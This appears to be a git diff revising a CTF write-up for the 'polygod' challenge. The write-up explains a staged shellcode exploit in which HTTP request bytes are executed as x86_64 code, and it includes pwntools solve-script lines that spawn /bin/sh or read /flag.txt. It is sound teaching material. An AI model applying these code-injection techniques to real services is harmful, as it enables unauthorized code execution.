@@ -26,8 +26,6 @@ In the challenge docker:
     - `nginx; echo \"$FLAG\" > /flag.txt` which saves the flag from the `FLAG` environment variable to the `/flag.txt` file.
     - `socat TCP4-LISTEN:8080,reuseaddr,fork EXEC:/srv/polygod` which sets up `socat` to listen on TCP port `8080` for incoming connection, forks on a new connection to execute `/srv/polygod`, and pipes the data from the connection to ``/srv/polygod` and the output of `/srv/polygod` back to the connection.
 
-*FIX AND DOUBLE CHECK ABOVE ^*
-
 ```docker
 FROM ubuntu@sha256:dc17125eaac86538c57da886e494a34489122fb6a3ebb6411153d742594c2ddc
 RUN apt update -y
@@ -74,12 +72,12 @@ The main function is pretty straightforward:
 4. read from stdin which is the piped HTTP request data from the proxy at `http://localhost:8080`.
 3. execute the code page by calling `run(code_rwx_page, data_rw_page)` which is executing the entire HTTP request as code.
 
-The main function in Binary Ninja's Pseudo C view:
+The main function in [Binary Ninja's](https://binary.ninja/) Pseudo C view:
 ![](../assets/posts/2025-10-19-polygod-writeup/images/binja_main.png)
 
 The run function pivots the stack to the mmaped data(`rw`) page by doing `mov rsp, rsi`. It then pushes `rdi` (the address of the mapped code(`rwx`) page holding stdin) onto the new stack, which decrements `rsp` by 8 and stores that address at `[rsp]`. A final `ret` will pop that qword and jump to it, transfering `rip` into the mapped code(`rwx`) page. The run function also clears registers before returning.
 
-The run function in Binary Ninja's Pseudo C view:
+The run function in [Binary Ninja's](https://binary.ninja/) Disassembly view:
 ![](../assets/posts/2025-10-19-polygod-writeup/images/binja_run.png)
 
 # Fuzzing for Input Constraints
@@ -131,9 +129,7 @@ Host: [HOSTNAME]\r\n
 
 Note that `abs_path` must start with a `/`.
 
-I assumed `abs_path` has only printable characters and fuzzed it with requests in the `abs_path` where it is a `/` followed by a printable character, then checked for the `400 Bad Request` response.
-
-However, for some reason this method of fuzzing for invalid characters didn't work like with `Method`. Some characters that returned `400 Bad Request` response were still allowed.
+I assumed `abs_path` has only printable characters and fuzzed it with requests in the `abs_path` where it is a `/` followed by a printable character, then checked for the `400 Bad Request` response. However, for some reason this method of fuzzing for invalid characters didn't work like with `Method`. Some characters that returned `400 Bad Request` response were still allowed. I kept in mind that `abs_path` might allow some non-printable characters because I wasn't able to confirm this with fuzzing.
 
 From there I just started to manually write assembly instructions instead of fixing/debugging the fuzzing.
 
@@ -151,9 +147,9 @@ The abstracted minimal HTTP GET request (first line):
 
 ## Exploit Overview
 
-1. Stage 1 shellcode to put a readable/writable address in `rdi` for an instruction that's executed in the next step.
-2. The required HTTP spec ` /` is the machine code for the `and BYTE PTR [rdi], ch` x86_64 instruction.
-3. Stage 2 shellcode to subtract the stack pointer by some fixed offset to get to the location of the Stage 3 shellcode and jump to it.
+1. Stage 1 shellcode to put a readable/writable address in `rdi` for the instruction that's executed in the next step.
+2. The required HTTP spec space followed by `/` is the machine code for the `and BYTE PTR [rdi], ch` x86_64 instruction.
+3. Stage 2 shellcode to subtract the stack pointer by some fixed offset to get to the location of the Stage 3 shellcode, then jump to it or within the NOPs sled.
 4. The remaining HTTP requests and Stage 3 shellcode
 
 The abstracted HTTP exploit request:
@@ -162,12 +158,12 @@ The abstracted HTTP exploit request:
 Host: localhost\r\n
 Content-Length: [BODY_LENTH]\r\n
 \r\n
-[NOP_SLED][STAGE3]
+[NOPS_SLED][STAGE3]
 ```
 
-The above follows the structure of a HTTP POST request so that the request body, which do not have any constraints, can be included in the request and used for Stage 3.
+The above follows the structure of a HTTP POST request so that the request body, which do not have any constraints, can include Stage 3.
 
-For Stag 3, I am overwriting the `index.html` with the `flag.txt`, then visiting the website.
+For Stage 3, I overwrote the `index.html` with the `flag.txt`, then visiting the website.
 
 Looking back now, I could have just done `cat /flag.txt` instead because `socat` will pipe the output of `polygod` back to the connection.
 
@@ -192,6 +188,9 @@ Looking back now, I could have just done `cat /flag.txt` instead because `socat`
 [NOP_SLED]
 [STAGE3]
 ```
+
+I am not sure why but **`abs_path` allows some non-printable ASCII characters** because I was able to include them in my stage2 shellcode.
+Maybe they are allowed to account for non-printable ASCII characters of other languages?
 
 # Solve script
 
@@ -305,15 +304,15 @@ if __name__ == "__main__":
     # init solve: overwrite index.html with flag.txt then check the website
     stage3_asm = shellcraft.execve("/bin/sh", ["sh", "-c", "cp /flag.txt /srv/index.html"])
 
-    # just cat the flag, socat will pipe the output of polygod back to the connection
+    # post solve: just cat the flag, socat will pipe the output of polygod back to the connection
     stage3_asm = shellcraft.cat("/flag.txt")
 
-    stage3_overwrite_html_w_flag = (b"\x90"*0x20)+asm(stage3_asm)
-    print("stage3\n", disasm(stage3_overwrite_html_w_flag))
+    stage3_win = (b"\x90"*0x20)+asm(stage3_asm)
+    print("stage3\n", disasm(stage3_win))
 
     method = stage1_writeable_addr_rdi
     abs_path = b"/" + stage2_jmp_to_body
-    body = stage3_overwrite_html_w_flag
+    body = stage3_win
     req = (
         method + b" " + abs_path + b" HTTP/1.1\r\n"
         b"Host: localhost\r\n"
